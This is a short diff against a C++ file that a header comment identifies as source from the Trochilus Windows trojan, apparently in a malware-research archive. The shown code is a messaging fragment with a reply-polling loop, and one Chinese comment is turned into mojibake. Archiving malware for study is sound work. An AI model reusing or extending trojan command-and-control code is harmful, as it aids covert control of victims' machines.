@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "AutoCleanup.h"
 #include "file/MyFile.h"
@@ -13,7 +24,7 @@ MSGSERIALID CommDataUtils::SendMessageToClient( LPCTSTR clientid, const CommData
 
 BOOL CommDataUtils::WaitForReply( LPCTSTR clientid, MSGSERIALID msgSerialID, CommData& replyData, DWORD dwWaitTimeoutS )
 {
-	//µÈ´ý»ØÓ¦
+	//ï¿½È´ï¿½ï¿½ï¿½Ó¦
 	DWORD dwSleepMS = 200;
 	BOOL bReplied = FALSE;
 	for (int i = 0; i < (int)(dwWaitTimeoutS * 1000 / dwSleepMS); i++)
